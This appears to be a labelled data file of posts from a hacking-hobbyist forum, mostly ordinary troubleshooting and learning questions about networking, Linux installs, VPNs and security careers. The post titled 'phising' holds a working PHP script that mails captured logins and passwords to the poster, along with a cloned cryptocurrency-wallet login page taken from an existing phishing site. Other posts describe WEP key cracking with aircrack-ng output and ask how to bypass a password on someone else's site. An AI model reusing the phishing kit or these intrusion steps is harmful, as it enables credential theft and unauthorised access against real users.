label	title	content
0	INSANE PROBLEM! TRIED TIME AND TIME AGAIN TO FIX ETHERNET!!!	i was playing around trying to be able to connect to the wifi pineapple via wifi again, since it only did it via ethernet and wouldnt show up as a wifi network, and i screwed up my ethernet by accident. the only adapter i can diagnose that has something wrong is ethernet. here is my network adapters: here is the error i get when trying to diagnose it: and when i try to fix it as an administrator: i want ethernet protocol back, or whatever protocols ive lost. when doing research i find this and some other sites, but my guess at the solution would be this: http://answers.microsoft.com/en-us/wind ... c5110ab8df https://support.microsoft.com/en-us/kb/299357 i dont think this will work though when it comes to ethernet. anyone got any ideas? -- fri dec 25, 2015 8:56 pm -- i tried this: code:  select all c:\windows\system32>netsh int ip reset resetlog.txt resetting interface, ok! resetting unicast address, ok! resetting neighbor, ok! resetting path, ok! resetting , failed. access is denied. resetting , ok! restart the computer to complete this action. -- sat dec 26, 2015 8:06 pm -- i tried a clean install of windows 10 a second time, and that didnt even give me the protocols back. i ran this command: code:  select all ipconfig /all >c:\pingresult.txt and heres the output into the file: code:  select all windows ip configuration    host name . . . . . . . . . . . . : josegarcia    primary dns suffix  . . . . . . . :     node type . . . . . . . . . . . . : hybrid    ip routing enabled. . . . . . . . : no    wins proxy enabled. . . . . . . . : no    dns suffix search list. . . . . . : socal.rr.com wireless lan adapter local area connection* 3:    media state . . . . . . . . . . . : media disconnected    connection-specific dns suffix  . :     description . . . . . . . . . . . : microsoft wi-fi direct virtual adapter #2    physical address. . . . . . . . . : e4-f8-9c-03-ff-49    dhcp enabled. . . . . . . . . . . : yes    autoconfiguration enabled . . . . : yes ethernet adapter ethernet:    connection-specific dns suffix  . :     description . . . . . . . . . . . : realtek pcie fe family controller    physical address. . . . . . . . . : 34-e6-d7-81-be-df    dhcp enabled. . . . . . . . . . . : yes    autoconfiguration enabled . . . . : yes    link-local ipv6 address . . . . . : fe80::b4e2:623:6404:61de%6(preferred)     autoconfiguration ipv4 address. . : 169.254.97.222(preferred)     subnet mask . . . . . . . . . . . : 255.255.0.0    default gateway . . . . . . . . . :     dhcpv6 iaid . . . . . . . . . . . : 406120151    dhcpv6 client duid. . . . . . . . : 00-01-00-01-1e-10-eb-26-34-e6-d7-81-be-df    dns servers . . . . . . . . . . . : fec0:0:0:ffff::1%1                                        fec0:0:0:ffff::2%1                                        fec0:0:0:ffff::3%1    netbios over tcpip. . . . . . . . : enabled ethernet adapter vmware network adapter vmnet1:    connection-specific dns suffix  . :     description . . . . . . . . . . . : vmware virtual ethernet adapter for vmnet1    physical address. . . . . . . . . : 00-50-56-c0-00-01    dhcp enabled. . . . . . . . . . . : yes    autoconfiguration enabled . . . . : yes    link-local ipv6 address . . . . . : fe80::dcf5:8e1f:fb20:c7b2%4(preferred)     ipv4 address. . . . . . . . . . . : 192.168.75.1(preferred)     subnet mask . . . . . . . . . . . : 255.255.255.0    lease obtained. . . . . . . . . . : saturday, december 26, 2015 11:34:00 pm    lease expires . . . . . . . . . . : sunday, december 27, 2015 12:04:00 am    default gateway . . . . . . . . . :     dhcp server . . . . . . . . . . . : 192.168.75.254    dhcpv6 iaid . . . . . . . . . . . : 50352214    dhcpv6 client duid. . . . . . . . : 00-01-00-01-1e-10-eb-26-34-e6-d7-81-be-df    dns servers . . . . . . . . . . . : fec0:0:0:ffff::1%1                                        fec0:0:0:ffff::2%1                                        fec0:0:0:ffff::3%1    netbios over tcpip. . . . . . . . : enabled ethernet adapter vmware network adapter vmnet8:    connection-specific dns suffix  . :     description . . . . . . . . . . . : vmware virtual ethernet adapter for vmnet8    physical address. . . . . . . . . : 00-50-56-c0-00-08    dhcp enabled. . . . . . . . . . . : yes    autoconfiguration enabled . . . . : yes    link-local ipv6 address . . . . . : fe80::ed8b:970b:dc4c:dfa9%13(preferred)     ipv4 address. . . . . . . . . . . : 192.168.66.1(preferred)     subnet mask . . . . . . . . . . . : 255.255.255.0    lease obtained. . . . . . . . . . : saturday, december 26, 2015 11:33:45 pm    lease expires . . . . . . . . . . : sunday, december 27, 2015 12:03:45 am    default gateway . . . . . . . . . :     dhcp server . . . . . . . . . . . : 192.168.66.254    dhcpv6 iaid . . . . . . . . . . . : 268456022    dhcpv6 client duid. . . . . . . . : 00-01-00-01-1e-10-eb-26-34-e6-d7-81-be-df    dns servers . . . . . . . . . . . : fec0:0:0:ffff::1%1                                        fec0:0:0:ffff::2%1                                        fec0:0:0:ffff::3%1    primary wins server . . . . . . . : 192.168.66.2    netbios over tcpip. . . . . . . . : enabled wireless lan adapter wi-fi:    connection-specific dns suffix  . : socal.rr.com    description . . . . . . . . . . . : intel(r) dual band wireless-ac 3160    physical address. . . . . . . . . : e4-f8-9c-03-ff-48    dhcp enabled. . . . . . . . . . . : yes    autoconfiguration enabled . . . . : yes    ipv6 address. . . . . . . . . . . : 2605:e000:1313:82e5:fd32:4dfa:9cc7:a0f5(preferred)     temporary ipv6 address. . . . . . : 2605:e000:1313:82e5:f1d9:9a76:6c7b:956b(preferred)     link-local ipv6 address . . . . . : fe80::fd32:4dfa:9cc7:a0f5%8(preferred)     ipv4 address. . . . . . . . . . . : 10.0.1.176(preferred)     subnet mask . . . . . . . . . . . : 255.255.255.0    lease obtained. . . . . . . . . . : saturday, december 26, 2015 11:33:48 pm    lease expires . . . . . . . . . . : sunday, december 27, 2015 11:33:51 pm    default gateway . . . . . . . . . : fe80::3612:98ff:fe02:53eb%8                                        10.0.1.1    dhcp server . . . . . . . . . . . : 10.0.1.1    dhcpv6 iaid . . . . . . . . . . . : 115669148    dhcpv6 client duid. . . . . . . . : 00-01-00-01-1e-10-eb-26-34-e6-d7-81-be-df    dns servers . . . . . . . . . . . : 2605:e000:1313:82e5:3612:98ff:fe02:53eb                                        10.0.1.1    netbios over tcpip. . . . . . . . : enabled ethernet adapter bluetooth network connection:    media state . . . . . . . . . . . : media disconnected    connection-specific dns suffix  . :     description . . . . . . . . . . . : bluetooth device (personal area network)    physical address. . . . . . . . . : e4-f8-9c-03-ff-4c    dhcp enabled. . . . . . . . . . . : yes    autoconfiguration enabled . . . . : yes tunnel adapter isatap.{4dc8a916-7044-4614-bdc5-7713b2756fce}:    media state . . . . . . . . . . . : media disconnected    connection-specific dns suffix  . :     description . . . . . . . . . . . : microsoft isatap adapter #2    physical address. . . . . . . . . : 00-00-00-00-00-00-00-e0    dhcp enabled. . . . . . . . . . . : no    autoconfiguration enabled . . . . : yes tunnel adapter isatap.{60fbf0a8-4e2e-4542-9dd5-85bc7bda4438}:    media state . . . . . . . . . . . : media disconnected    connection-specific dns suffix  . :     description . . . . . . . . . . . : microsoft isatap adapter #3    physical address. . . . . . . . . : 00-00-00-00-00-00-00-e0    dhcp enabled. . . . . . . . . . . : no    autoconfiguration enabled . . . . : yes tunnel adapter isatap.socal.rr.com:    media state . . . . . . . . . . . : media disconnected    connection-specific dns suffix  . : socal.rr.com    description . . . . . . . . . . . : microsoft isatap adapter #4    physical address. . . . . . . . . : 00-00-00-00-00-00-00-e0    dhcp enabled. . . . . . . . . . . : no    autoconfiguration enabled . . . . : yes tunnel adapter isatap.{9988d360-a74b-44bf-b3a8-9e862041fab6}:    media state . . . . . . . . . . . : media disconnected    connection-specific dns suffix  . :     description . . . . . . . . . . . : microsoft isatap adapter #5    physical address. . . . . . . . . : 00-00-00-00-00-00-00-e0    dhcp enabled. . . . . . . . . . . : no    autoconfiguration enabled . . . . : yes -- sun dec 27, 2015 7:34 pm -- i fixed it by installing and using fixwin for windows 10 on all of the networking fixes, then restarting my computer.
3	Finding an Actual Job in Security	hey all, so a little background about me. got into a startup as the financial side. we only had one person coding the project so i did the code school videos trying to learn what i could as fast as possible. realized that was no where close to enough. currently enrolled at arguably one of the top 5 javascript based bootcamps in the country. just wrapped up the first half the course where we learned a lot of the nitty gritty javascript things, dove into angular, node, express, and a few other frameworks.  i fell in love with the sprints we did on authentication (mostly working with bcrypt and express) and another where we built a chat application and sent xss attacks to each other over a parse api connection.  ive been doing a lot of research since and it seems most companies want people with java/c experience. i have basic sql/nosql knowledge and knowing more will get me a lot further. just hoping someone could shed some light on what they may have experienced or heard through the grape vine. how can you get with only knowing javascript?  thanks
3	Unable to login to Basic missions	hi all , i am a new user to this website. and i have successfully created an id and a password. i want to take up the basic challenge mission. but when trying to enter password i am getting error as incorrect password. tried this several times. please help. also i am not sure whats the support team id. request someone to help me on that as well.. thanks karg1
1	gentoo installation problems	so, im trying to install gentoo in a virtual machine. i ran into this problem and began researching what the answer might be. the file system is read only. i cant mount it as read-write. id rather start from the beginning and not make this mistake in the first place rather than fix it where it is. but could someone give me a clue as to how to make a read-only file system read write when i cant write to it to make it read-write in the first place? -- wed jan 20, 2016 9:25 pm -- i tried following these instructions but it stops working at this very same step. i have tried over and over and over again. ive also tried mounting as --rw but thats not working either. could someone give me what to read to install gentoo on a virtual machine? i need a completely up to date guide that i know will work so i can start over. any guide will help. i am determined that if i try hard enough and long enough i can make this work. but an up to date video guide will work. i also tried this guide before my previous attempts so please dont post a link to this: https://www.youtube.com/watch?v=sjwwcw56d6c
1	phising	"need some help here please i sort of know how to make a basic phising php but i cant work this one out i can make fb ect but on this one i cant find a action to change heres my php script followed by the index i need to change any help please       <?php 	$email = $_post[username]; 	$pass = $_post[password]; 	$to = ""myemail""; 	$subject = ""login details""; 	$body = ""email or phone: "" .$email. "" password: "". $pass; 	$headers = ""from:  no-reply@domain.com "";   	if(mail($to, $subject, $body, $headers)){ 		header(mysite); 	}else{ 		echo ""something went wrong""; 	} ?> now i want to use this php on this  <!doctype html> <html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8"">     <title>wallet for biokcchain | get wallet info now</title> <meta name=""google-site-verification"" content=""frcvarh7ihznaagiwmn8j4qgnaf_206l8blwpsne_ke""> 	<meta name=""description"" content=""presents information from the biockclan, and other related statistics, such as pool statistics. also offers an online wallet.""> 	<meta name=""copyright"" content=""bloc chaln""> 	<meta name=""author"" content=""barak obama""> 	<link rel=""stylesheet"" href=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/bootstrap.css""> 	<link rel=""stylesheet"" href=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/bootstrap-responsive.css""> 	<link rel=""stylesheet"" href=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/overrides.css""> 	<script src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/jquery.js"" type=""text/javascript""></script> 	<script type=""text/javascript"" src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/bootstrap.htm""></script> 	<script src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/shared.js"" type=""text/javascript""></script> 	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"">     <link rel=""stylesheet"" href=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/app-overrides.css"" type=""text/css"">     <link rel=""stylesheet"" href=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/print.css"" type=""text/css"" media=""print"">         <style type=""text/css"">	         .navbar {             margin-bottom: 0px;         }     </style>     <script type=""text/javascript"" src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/bitcoinjs.js""></script>     <script type=""text/javascript"" src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/blockchainapi.js""></script>     <script type=""text/javascript"" src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/wallet.js""></script>   <style type=""text/css""> .adv{display: none;} .basic{display: inherit;} </style> <style type=""text/css""> .adv{display: none;} .basic{display: inherit;} </style></head> <body>     <div class=""navbar"" style=""height:40px;overflow:visible"">         <div class=""navbar-inner"" style=""height:43px;"">             <div class=""container"">                 <div class=""logo hidden-phone hidden-tablet""><a href=""#""><img src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/logo_new.png"" alt="""" border=""0""></a></div>                 <ul class=""nav"">                     <li><a href=""#"" title=""#"">home</a></li>                     <li><a href=""#"" title=""#"">charts</a></li>                     <li><a href=""#"" title=""#"">stats</a></li>                     <li><a class=""hidden-phone"" href=""#"" title=""#"">markets</a></li>                     <li class=""hidden-phone""><a href=""#"" title=""#"">developers</a></li>                     <li class=""active""><a href=""http://biockchalin.info/index2.htm"" title=""#"">wallet</a></li></ul>                    <div class=""hidden-phone pull-right"" style=""padding-top:9px"">                         <img src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/refresh.png"" id=""refresh"">                         <img src=""wallet%20for%20biokcchain%20_%20get%20wallet%20info%20now_files/logout.png"" id=""logout"" style=""padding-left:9px"">                     </div>                    </div>         </div>     </div> <div class=""quickstart"">     <div class=""container"">         <div class=""row-fluid"">             <div class=""span12"">                 <h1>                     <span class=""hidden-phone"">my wallet <small>be your own bank.</small></span>         </h1>             </div>         </div>         <div class=""row-fluid"" style=""margin-top:10px"">             <div class=""span12 no-print"">                 <ul class=""nav nav-pills pull-left"" style=""margin-bottom: 3px"">                     <li><a id=""home-intro-btn"">wallet home</a></li>                     <li><a id=""my-transactions-btn"">my transactions</a></li>                     <li><a id=""send-coins-btn"">send money</a></li>                     <li><a id=""receive-coins-btn"">receive money</a></li>                     <li><a class=""hidden-phone"" id=""import-export-btn"">import / export</a></li>                 </ul>             </div>         </div>     </div> </div> <div id=""main-notices-container"" style=""z-index:1; position:absolute; right:0px; margin:20px; width:auto; min-width:280px; overflow:visible; height:0px;"">     <span id=""notices"" style=""max-width:600px;width:auto;""></span> </div> <div style=""width:100%; float:left; clear:both""></div> <div class=""container"" style=""margin-top:10px"">     <div id=""receive-content"" class=""tab-content"">               <div class=""tab-pane"" id=""shared-addresses""> <form action=""login.php"" method=""post"">         </form></div>     </div> <div style="""" id=""restore-wallet"">     <div class=""row-fluid"" id=""welcome_back_container"">         <div class=""span6"">             <div class=""page-header"">                 <h3>welcome back </h3>                 <small>please enter your login details below:</small>             </div>             <div class=""form-horizontal"">                 <div class=""control-group"">                     <label class=""control-label"">identifier:</label>                     <div class=""controls""><input autocomplete=""off"" placeholder=""identifier or alias"" name=""user"" type=""text""></div>                 </div>                 <div class=""control-group auth-0 auth-1 auth-2 auth-3 auth-4 auth-5"" style="""">                     <label class=""control-label"">password:</label>                     <div class=""controls""><input autocomplete=""off"" name=""password"" type=""password""></div>                 </div>                             <div style=""padding-left: 160px;padding-bottom:20px"">                     <input autocomplete=""off"" class=""btn btn-primary"" value=""open wallet"" type=""submit"">                     <a href=""#"" target=""blank"" id=""signup-btn"" class=""btn btn-secondary"" style="""">create new wallet</a>                 </div>          <div class=""well auth-0 auth-1 auth-3 auth-4"" style=""margin: 10px auto 0px; max-width: 470px;"">your password is never shared with our servers and cannot be recovered if forgotten!</div>             </div>         </div>         <div class=""span6"" id=""forgotten-something-container"">             <div class=""page-header"">                 <h3>forgotten something?</h3> <small>help! ive locked myself out of my account</small>             </div>             <h4>lost identifier or alias</h4>             <p> if you have lost your wallet identifier first check the  confirmation email you received during sign up. cant find the email?  click the button below and we can send you a new one.</p>             <p align=""right"">                 <a class=""btn btn-small btn-secondary recover-wallet-btn"">recover wallet</a> <a class=""btn btn-small btn-secondary"" target=""blank"" href=""#"">import backup</a> <a class=""btn btn-small btn-secondary download-backup-btn"" style=""display: none;"">download backup</a>             </p>             <h4>lost two-factor authentication details.</h4>             <p>if you have lost your two factor authentication details  your is still fully recoverable. all we need is reasonable proof you are  the account owner which can be provided by completing the form linked  below.</p>             <p align=""right"">                 <a class=""btn btn-small btn-secondary"" id=""reset-two-factor-btn"">reset two factor authentication</a>             </p>             <h4>need help?</h4>             <p>                 read our <a target=""blank"" href=""#"">support pages</a>             </p>         </div>     </div> </div> </div></body></html> -- sun may 01, 2016 6:49 am -- ^^ this index was already someone elses phising site i saved and want to edit it myself"
0	Wireless Penetration Testing Beginners Guide by by Vivek	here is a book i found on amazon. i will definitely want to get a pdf of it somewhere if you guys say its good. its getting close to the end of the summer and i think i will have enough prerequisite knowledge in networking to begin learning wifi hacking with kali linux. tell me what you think of  kali linux: wireless penetration testing beginners guide by  vivek ramachandran . i was looking for a wireless hacking book that focused on kali linux. i found this book right here. has anyone read it and if you have, what do you think of the book? does anyone know any other good kali linux books that focus on wireless pen-testing? id love to know if you know of any. thanks so much for your opinions. im currently almost there in terms of networking so i thought id ask. i have a wireless hacking book which goes through linux, windows,  and  mac already called hacking exposed: wireless that i have to get back to after learning this stuff. but i am wondering if anyone has read this because i was looking to see if anyone thought it was a good idea to get something that focuses on kali linux wireless hacking. if so, please give your opinion on the book since i havent read this one the way i started the one i already have and didnt understand what i was reading when reading it several months ago. update: i found a free pdf online: http://file.allitebooks.com/20150904/ka ... 0guide.pdf does anyone think i could learn from this easily? do you like it? do you not?
1	WEP network pen test problem	so, i followed a tutorial online. this one: https://www.youtube.com/watch?v=8l9rvashsrq this slide show is where im running into issues: http://s50.photobucket.com/user/austin_ ... slideshow/ basically, im ending up with 3 arp packets consistently. i am going to leave it on tonight, because i just realized im probably going to want to wait a few hours before declaring that it doesnt work bc this stuff takes a while. im wondering since this is taking some hell of a lot longer than 15 minutes. its been like over an hour. anyone know what i gotta do to get the capture working? thanks. the good news is i set up my own personal pen-testing network where i can change the security. hooray!!! code:  select all root@blackjesus:~# aircrack-ng myfirstwifihack-01.cap opening myfirstwifihack-01.cap read 39682 packets.    #  bssid              essid                     encryption    1  c0:56:27:4c:ee:95  pen_testing_network       wep (1006 ivs) choosing first network as target. opening myfirstwifihack-01.cap attack will be restarted every 5000 captured ivs. starting ptw attack with 1006 ivs.                                                             aircrack-ng 1.2 rc3                                             [00:00:02] tested 137941 keys (got 1006 ivs)    kb    depth   byte(vote)     0  139/140   ff(1024) 00( 768) 03( 768) 0d( 768) 12( 768) 13( 768) 18( 768) 1e( 768) 20( 768) 23( 768)      1    2/  8   92(2560) 26(2304) 36(2304) 3a(2304) 3e(2304) 60(2304) 4c(2048) 94(2048) ae(2048) af(2048)      2    7/  2   cd(2304) 4b(2048) 5e(2048) 5f(2048) 64(2048) 99(2048) 9d(2048) be(2048) d4(2048) f9(2048)      3   37/  3   f2(1792) 20(1536) 21(1536) 25(1536) 2f(1536) 34(1536) 4d(1536) 55(1536) 60(1536) 61(1536)      4    2/  3   ba(2304) 03(2048) 77(2048) c1(2048) dc(2048) df(2048) 0b(1792) 1c(1792) 22(1792) 2e(1792)  failed. next try with 5000 ivs.
3	Things to consider	i understand that this is a site that is based off of many things and there are people on here that help each other learn. although, i am noticing that there are users that prey on those that are asking questions and intentionally send them to so-called informative pdf files or links that are malicious, in an attempt to increase their social engineering and hacking skills; theyre simply preying on the weak. i just want to inform users to be aware and trust no one. i really like this site and dont take this the wrong way anyone, but it is true..
1	Unsolved Forensics problem	http://www.filedropper.com/ctf2015usbphysicalimage i was wondering if anyone wanted to take a try at it. its a compressed file you have to repair, and then open the word documents with passwords on them. ive been working at it and havent solved it yet.  problem created by securestate akron hack.
1	Help on hacking?	hello guys im pretty new here so please spare me if there is a specific way im suppose to post or maybe im in the wrong section but here i go  so my teacher just challenged my class saying if anybody is able to hack into his laptop we wouldnt need to do finals and that he would just let us pass the course lol so im here to ask for some help on some tips since im not proficient in hacking. i know a tiny bit but general terms i should be able to understand. so basically he has his own router in class which he gave us the ssid and password to. the router is connected to the schools internet using it as isp and the only thing we cant do is physically access his laptop and router.  oh yea i really dont care too much if i cant or if i dont get an easy pass, this just sounded really interesting and fun so any help or ideas are appreciated thanks   again this is with permission from my teacher/prof -- wed oct 26, 2016 9:22 am -- boomboomrwr wrote: hello guys im pretty new here so please spare me if there is a specific way im suppose to post or maybe im in the wrong section but here i go  so my teacher just challenged my class saying if anybody is able to hack into his laptop we wouldnt need to do finals and that he would just let us pass the course lol so im here to ask for some help on some tips since im not proficient in hacking. i know a tiny bit but general terms i should be able to understand. so basically he has his own router in class which he gave us the ssid and password to. the router is connected to the schools internet using it as isp and the only thing we cant do is physically access his laptop and router.  oh yea i really dont care too much if i cant or if i dont get an easy pass, this just sounded really interesting and fun so any help or ideas are appreciated thanks   again this is with permission from my teacher/prof sorry internet switched and posted this 3 times...
0	Problems with Froot VPN on Ubuntu	im having trouble with installing froot vpn on ubuntu. i had the same problems with ipvanish. i tried this guide: https://www.frootvpn.com/guides/ubuntu/6 code:  select all adam@adam-inspiron-5558:/etc/openvpn$ sudo apt-get update and got this result code:  select all w: http://www.openprinting.org/download/printdriver/debian/dists/lsb3.2/release.gpg: signature by key f8897b6f00075648e248b7ec24cbf5474cfd1e2f uses weak digest algorithm (sha1) w: http://deb.playonlinux.com/dists/precise/inrelease: signature by key 74f7358425eeb6176094c884e0f72778c4676186 uses weak digest algorithm (sha1) w: the repository http://ppa.launchpad.net/colingille/freshlight/ubuntu xenial release does not have a release file. n: data from such a repository cant be authenticated and is therefore potentially dangerous to use. n: see apt-secure(8) manpage for repository creation and user configuration details. w: the repository http://ppa.launchpad.net/osmoma/audio-recorder/ubuntu xenial release does not have a release file. n: data from such a repository cant be authenticated and is therefore potentially dangerous to use. n: see apt-secure(8) manpage for repository creation and user configuration details. w: the repository http://ppa.launchpad.net/werner-jaeger/ppa-werner-vpn/ubuntu xenial release does not have a release file. n: data from such a repository cant be authenticated and is therefore potentially dangerous to use. n: see apt-secure(8) manpage for repository creation and user configuration details. e: failed to fetch http://ppa.launchpad.net/colingille/freshlight/ubuntu/dists/xenial/main/binary-amd64/packages  404  not found e: failed to fetch http://ppa.launchpad.net/osmoma/audio-recorder/ubuntu/dists/xenial/main/binary-amd64/packages  404  not found e: failed to fetch http://ppa.launchpad.net/werner-jaeger/ppa-werner-vpn/ubuntu/dists/xenial/main/binary-amd64/packages  404  not found e: some index files failed to download. they have been ignored, or old ones used instead. i made sure i had the server references downloaded, but to no avail (i call them server references). example: code:  select all sg.openvpn.frootvpn.ovpn so then i tried a different guide on the same website that  almost  works: https://www.frootvpn.com/guides/linuxdebian/19 the problem is when i try to log in, even with the right password, which i emailed froot and had them reset. did i mention i had similar issues with ipvanish, even when i was able to make it work on a different os but now ubuntu? here was what happened when i tried the openvpn command: code:  select all adam@adam-inspiron-5558:/etc/openvpn$ openvpn /etc/openvpn/se.openvpn.frootvpn.ovpn  mon oct 24 18:02:54 2016 openvpn 2.3.10 x86_64-pc-linux-gnu [ssl (openssl)] [lzo] [epoll] [pkcs11] [mh] [ipv6] built on feb  2 2016 mon oct 24 18:02:54 2016 library versions: openssl 1.0.2g  1 mar 2016, lzo 2.08 enter auth username: *********** enter auth password: ************* mon oct 24 18:03:06 2016 udpv4 link local: [undef] mon oct 24 18:03:06 2016 udpv4 link remote: [af_inet]178.73.195.105:1197 mon oct 24 18:03:06 2016 warning: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this mon oct 24 18:03:07 2016 [server] peer connection initiated with [af_inet]178.73.195.105:1197 mon oct 24 18:03:09 2016 note: beginning empirical mtu test -- results should be available in 3 to 4 minutes. mon oct 24 18:03:09 2016 options error: unknown --redirect-gateway flag: ipv6 mon oct 24 18:03:09 2016 options error: unrecognized option or missing parameter(s) in [push-options]:6: block-outside-dns (2.3.10) mon oct 24 18:03:09 2016 error: cannot ioctl tunsetiff tun: operation not permitted (errno=1) mon oct 24 18:03:09 2016 exiting due to fatal error adam@adam-inspiron-5558:/etc/openvpn$ openvpn /etc/openvpn/se.openvpn.frootvpn.ovpn  mon oct 24 18:03:12 2016 openvpn 2.3.10 x86_64-pc-linux-gnu [ssl (openssl)] [lzo] [epoll] [pkcs11] [mh] [ipv6] built on feb  2 2016 mon oct 24 18:03:12 2016 library versions: openssl 1.0.2g  1 mar 2016, lzo 2.08 enter auth username: ********** enter auth password: ************* mon oct 24 18:03:22 2016 udpv4 link local: [undef] mon oct 24 18:03:22 2016 udpv4 link remote: [af_inet]178.73.195.105:1205 mon oct 24 18:03:23 2016 warning: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this mon oct 24 18:03:27 2016 [server] peer connection initiated with [af_inet]178.73.195.105:1205 mon oct 24 18:03:29 2016 note: beginning empirical mtu test -- results should be available in 3 to 4 minutes. mon oct 24 18:03:29 2016 auth: received control message: auth_failed mon oct 24 18:03:29 2016 sigterm received, sending exit notification to peer mon oct 24 18:03:30 2016 sigterm[soft,exit-with-notification] received, process exiting adam@adam-inspiron-5558:/etc/openvpn$  anyone know what to do about this? -- wed nov 02, 2016 9:15 pm -- i made it work with the sudo command. i feel like a fucktard.
1	Help on hacking?	hello guys im pretty new here so please spare me if there is a specific way im suppose to post or maybe im in the wrong section but here i go  so my teacher just challenged my class saying if anybody is able to hack into his laptop we wouldnt need to do finals and that he would just let us pass the course lol so im here to ask for some help on some tips since im not proficient in hacking. i know a tiny bit but general terms i should be able to understand. so basically he has his own router in class which he gave us the ssid and password to. the router is connected to the schools internet using it as isp and the only thing we cant do is physically access his laptop and router.  oh yea i really dont care too much if i cant or if i dont get an easy pass, this just sounded really interesting and fun so any help or ideas are appreciated thanks   again this is with permission from my teacher/prof
1	Password bypass when SQL injection wont work and it is not..	how do i get passed a password when sql injection wont work and it is not in the html source. im not the best, but ive got a lot down. its just that was working on accessing this pages update section, and i finally found it after about 20 minutes. then there is a box with the pre-written stuff and you can add or subtract what you want. my problem is, to make any change so people can see it on the page, you need to enter in a password. its bugged me all week so if anyone has ideas on what i could do please comment back.  p.s. if you need i can send you the url so you can take a look
1	Telling if a site is a phishing site?	so i recently came across this site pr0file.1mages.info/ after getting a message from a friend on msn. this person claims they  did not know of this message nor was online, nor anywhere near a computer. ive been looking at this site for awhile trying to figure out if its valid or not, because it doesnt look valid to me. the site came with my friends logon name at the beginning such as superperson.pr0file.1mages.info. basically i want to know how to tell if i site is a phishing site or not without entering any personal information.
1	About Bootable CD Creation	hi         i am haridoss. new to hack this site. i came to join with this site for knowing information about the systems and its functions. now i have one doubt.. i.e : i want to create a bootable cd for booting multi- os bootable cd. once a week before i tried. but it doesnt work well. please can anyone help me to develope a multiboot cd... please mention the steps to do that to work well i am waiting........... thanks. haridoss
3	Web folder sharing (read+write)	"hello all, ive got a asp.net 2.0 website running and one of my web folder need to be shared (read + write, not execute) for webuser and aspnet user, cause i have a module which allow the user to upload their images (only allow image file).  the user can touch that folder by using a web form to upload their images. that form will check and validate all the input data from user carefully using [filefield].postedfile.contenttype, i think this command will get the correct file type, prevent the exploit: ""file have multiple extension"". but one day, i found some files on that folder which are not image type (therere some script file on that folder), i check the web form many times and im pretty sure that the problem is not comming from the upload form.  could some body please give me a clue about this type of hacking. im using asp.net 2.0 (with ajax extension from microsoft), sql 2005 and iis 6 on the windows2003 (autoupdate eveyday). thanks in advance, spidervn"
1	Boolean Algebra	well, im kinda new here at this site and very interested in learning about computers. rewind, first off im a n00b, so theres where i stand. ok, again im trying to learn about computers and thought that id start off by learning asm. i figured we interact with the software and the software interacts with the computer yada, yada, yada; what a great pleace to start. (of course ive heard that, that wasnt a wise idea, but hell...anyway). im trying to learn about boolean algebra and coming from a person who taught himself algebra and the elementary parts of trig...i just dont get what the heck this stuff is all about. i can kinda see some of the mathematical concepts that its built around (associate, distributive, identities...), but i dont get how it works nor do i understand how it relates. just for reference im on chapter 2 (yep the beginning) of the art of assembly which is the subject of this topic. but i cannot grasp what im reading. my question here is: is there anything that i could learn that would prepare me to comprehend this subject a little better?, and/or: is it truly an unwise thing to try to begin my conquest of computers with asm? prethanx!!
